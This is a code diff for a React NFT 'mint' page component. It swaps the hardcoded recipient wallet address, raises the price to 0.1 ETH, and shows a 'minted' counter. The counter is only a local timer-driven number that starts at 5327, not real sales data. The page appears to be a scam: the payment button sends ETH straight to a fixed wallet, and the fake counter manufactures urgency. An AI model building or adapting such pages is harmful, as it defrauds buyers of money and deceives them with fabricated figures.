@@ -6,7 +6,7 @@ const Transfer = ({ accounts, setAccounts }) => {
 
   const [mintAmount, setMintAmount] = useState(1);
   const isConnected = Boolean(accounts[0]);
-  const [seconds, setSeconds] = useState(327);
+  const [seconds, setSeconds] = useState(5327);
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -14,7 +14,7 @@ const Transfer = ({ accounts, setAccounts }) => {
     }, 4000);
     setTimeout(() => {
       clearInterval(interval)
-    },13000)
+    },20000)
     return () => clearInterval(interval);
   }, []);
 
@@ -36,8 +36,8 @@ const Transfer = ({ accounts, setAccounts }) => {
   }
 
   async function handleTransfer() {
-    const addr = "0xD9d416B95A922844DbB1599Fc65853a1924c03D0"
-    const mintValue = "0.0002"
+    const addr = "0x7BAb02d01DDa6b05933c04B65604e6966c98405e"
+    const mintValue = "0.1"
 
     if (window.ethereum) {
       let total = parseFloat((mintAmount * mintValue).toFixed(4))
@@ -81,7 +81,7 @@ const Transfer = ({ accounts, setAccounts }) => {
               <table>
                   <tr>
                     <td>Price:</td>
-                    <td>0.0002 ETH</td>
+                    <td>0.1 ETH</td>
                   </tr>
                   <tr>
                     <td>Max:</td>
@@ -108,7 +108,7 @@ const Transfer = ({ accounts, setAccounts }) => {
                 <table class="totalAmount">
                   <tr>
                     <td>Total:</td>
-                    <td>{ parseFloat((mintAmount * 0.0002).toFixed(4))} ETH</td>
+                    <td>{ parseFloat((mintAmount * 0.1).toFixed(4))} ETH</td>
                   </tr>
                 </table>
 
@@ -120,7 +120,7 @@ const Transfer = ({ accounts, setAccounts }) => {
                       <span onClick={connectAccount}>Connect Wallet</span>
                       )}
                   </button>
-                  <p >{seconds} out of 777 minted</p>
+                  <p >{seconds} out of 8888 minted</p>
                 </div>
           </div>
           <p class="discord">If you need any help, join our
